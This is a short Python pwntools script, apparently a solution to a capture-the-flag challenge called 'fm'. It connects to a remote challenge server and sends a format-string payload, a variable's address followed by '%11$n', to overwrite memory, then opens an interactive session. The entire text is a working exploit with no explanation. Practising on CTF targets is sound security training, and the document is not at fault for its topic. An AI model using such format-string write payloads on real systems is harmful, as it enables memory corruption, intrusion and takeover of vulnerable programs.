from pwn import *
context(log_level='debug')
#io = process("./fm")
io = remote("node3.buuoj.cn",26157)
x_addr = 0x0804A02C
payload = p32(x_addr) + "%11$n"
io.sendline(payload)
io.interactive()